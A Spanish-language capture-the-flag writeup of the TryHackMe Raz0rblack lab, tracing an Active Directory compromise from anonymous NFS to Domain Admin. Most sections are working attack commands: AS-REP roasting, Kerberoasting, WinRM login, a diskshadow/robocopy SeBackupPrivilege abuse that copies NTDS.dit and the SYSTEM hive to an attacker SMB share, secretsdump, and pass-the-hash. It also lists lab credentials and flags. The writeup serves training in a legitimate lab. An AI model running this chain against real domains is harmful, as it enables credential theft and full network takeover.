# TryHackMe — Raz0rblack · Writeup COMPLETO (null → Domain Admin)

- **Target:** `10.129.153.245` (IP tras redeploy; la original era `.180`)
- **Dominio:** `raz0rblack.thm` · **DC:** `HAVEN-DC` (HAVEN-DC.raz0rblack.thm) · Windows Server 2019 (10.0.17763)
- **Estado final:** **DOMAIN ADMIN / root** vía SeBackupPrivilege → NTDS.dit → Pass-the-Hash. ✅
- **Root flag:** `THM{1b4f46cc4fba46348273d18dc91da20d}`
- **Cadena:** NFS anónimo → directorio de personal → userlist (conv. `flast`) → AS-REP roast (twilliams) → Kerberoast (xyan1d3, en *Remote Management Users*) → WinRM → BloodHound sin ACLs → enum manual → `SeBackupPrivilege` → dump NTDS.dit → hash Administrator → PtH.

### 🔑 Loot / credenciales
| Usuario | Pass / Hash | Origen | Vale para |
|---|---|---|---|
| **twilliams** | `roastpotatoes` | AS-REP roast + hashcat -m 18200 | 1ª cred → Kerberoast |
| **xyan1d3** | `cyanide9amine5628` | Kerberoast con twilliams + -m 13100 | **Remote Management Users** → WinRM (foothold) |
| **Administrator** | NT `9689931bed40ca5a2ce1218210177f0c` | NTDS.dit (SeBackupPrivilege) | **PtH → Domain Admin** |

> De los 12 empleados, solo **3 existen** como cuentas AD (twilliams, sbradley, lvetrova) + xyan1d3 (cuenta de servicio con SPN). lvetrova era "AD admin" pero el camino no pasó por ella: fue directo por SeBackupPrivilege.

---

## 1. Recon
DC raz0rblack.thm (HAVEN-DC). **Anomalías que marcan el orden:**
- **2049 NFS** en un DC Windows = rarísimo → superficie nº1.
- **NO hay 445** (solo 139) → la enum SMB clásica no va; Kerberos (88) sí.
- **5985 WinRM** abierto → foothold cuando haya creds.

## 2. NFS anónimo → directorio de personal
```bash
showmount -e $IP                       # ver exports
sudo mount -t nfs $IP:<export> /mnt/nfs
sudo ls /mnt/nfs                       # employee_status.xlsx + sbradley.txt
```
- `employee_status.xlsx` = lista de empleados + roles (incluye "ljudmila vetrova — AD ADMIN").
- `sbradley.txt` = una **flag** (`THM{ab53e05c9a98def00314a14ccbfa8104}`) + chiva la **convención de nombres**: steven bradley → `sbradley` = **inicial + apellido** (`flast`).
- Permisos: hay que `sudo cp` para sacarlos (root_squash mapea tu user).

## 3. Userlist + AS-REP roast → primera credencial
```bash
awk '{print $1, $2}' users_sucio > names
./username-anarchy -f flast -i names > usernames        # genera dport, lvetrova, twilliams...
impacket-GetNPUsers raz0rblack.thm/ -usersfile usernames -dc-ip $IP -no-pass -format hashcat -outputfile asrep.txt
```
- GetNPUsers **valida y rostiza a la vez**: los que no existen → `PRINCIPAL_UNKNOWN`; los válidos sin preauth → `$krb5asrep$`.
- Cae **twilliams** (sin preauth). `hashcat -m 18200` → **`roastpotatoes`**.
- ⚠️ Gotcha hashcat: guardar el hash con `-outputfile` (si lo pegas a mano, la shell se come los `$krb5asrep$23$` → "Signature unmatched").

## 4. Kerberoast (ya autenticado) → cuenta con WinRM
```bash
impacket-GetUserSPNs raz0rblack.thm/twilliams:'roastpotatoes' -dc-ip $IP -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt
```
- SPN de **xyan1d3** → `$krb5tgs$` → **`cyanide9amine5628`**.
- La columna `MemberOf` chiva lo importante: **`Remote Management Users`** = puede entrar por **WinRM**.
```bash
nxc winrm $IP -u xyan1d3 -p 'cyanide9amine5628'     # (Pwn3d!)
evil-winrm -i $IP -u xyan1d3 -p 'cyanide9amine5628' # foothold
```

## 5. BloodHound vacío → enumeración manual
```bash
bloodhound-python -u xyan1d3 -p 'cyanide9amine5628' -d raz0rblack.thm -ns $IP -c All --zip
```
- ⚠️ **`-ns <IP_DC>` obligatorio** (el DC es el DNS del dominio); sin eso → `Failed to resolve LDAP server IP`.
- Resultado: **ni twilliams ni xyan1d3 tienen outbound object control** → no hay cadena de ACLs.
- **BloodHound vacío ≠ callejón** (lección VulnNet: Roasted). Como ya hay **shell en el DC**, se enumera a mano desde dentro. El árbol anti-pánico Windows dice: **`whoami /priv` / `whoami /all` lo PRIMERO.**

## 6. SeBackupPrivilege → NTDS.dit → Domain Admin
```powershell
whoami /priv     # -> SeBackupPrivilege: Enabled   ← el billete a root
```
**Modelo mental:** `ntds.dit` (BD de AD con todos los hashes) está *locked* (lsass) y protegida por ACL. `SeBackupPrivilege` salta la ACL (`robocopy /b`); la **shadow copy** (`diskshadow`) resuelve el *locked* (foto congelada del disco).
```bash
# [KALI] buzón SMB
sudo impacket-smbserver s . -smb2support -username df -password df
```
```powershell
# [VÍCTIMA]
net use K: \\<TUN0>\s df /user:df
"set context persistent nowriters","set metadata C:\Windows\Temp\meta.cab","add volume c: alias cdrive","create","expose %cdrive% z:" | Set-Content C:\Windows\Temp\shadow.txt -Encoding Ascii
diskshadow /s C:\Windows\Temp\shadow.txt
robocopy /b z:\windows\ntds\ K:\ ntds.dit     # /b = usa SeBackupPrivilege (sin /b = Access Denied)
reg save hklm\system K:\system.bak            # boot key para descifrar el ntds
```
```bash
# [KALI] (los ficheros caen como root -> chown antes)
sudo chown kali:kali ntds.dit system.bak
impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
# -> Administrator:500:...:9689931bed40ca5a2ce1218210177f0c:::
```
**Pass-the-Hash → root:**
```bash
evil-winrm -i $IP -u Administrator -H 9689931bed40ca5a2ce1218210177f0c
# root.xml -> PSCredential con la flag en hex -> THM{1b4f46cc4fba46348273d18dc91da20d}
```

---

## Lecciones transversales
1. **Servicio anómalo = superficie nº1.** NFS en un DC Windows gritaba "mírame".
2. **Sin 445, el userenum va por Kerberos** (kerbrute / GetNPUsers), no por SMB rid-brute.
3. **GetNPUsers con lista hace doble función:** valida usuarios + rostiza. "Sin salida" era ambiguo → kerbrute desambigua.
4. **Orden de roasting por dependencias:** AS-REP (sin creds) → crackeas → Kerberoast (con esa cred). Kerberoast **nunca** antes de tener credenciales.
5. **La columna `MemberOf` del Kerberoast es inteligencia:** "Remote Management Users" = WinRM directo.
6. **BloodHound sin ACLs ≠ fin → enum manual + `whoami /priv`.** El privesc era un **privilegio**, no una arista.
7. **SeBackupPrivilege = root en un DC:** diskshadow (desbloquea) + `robocopy /b` (salta ACL) + hive SYSTEM → NTDS → PtH.

## Huecos de chuleta detectados (añadidos)
- `bloodhound-python` → **siempre `-ns <IP_DC>`** (DC = DNS del dominio).
- **SMB server con `sudo`** → ficheros caen como root → `chown` antes de usarlos con secretsdump.
- Sección **SeBackupPrivilege/diskshadow** reescrita con el modelo mental (estaba demasiado comprimida).
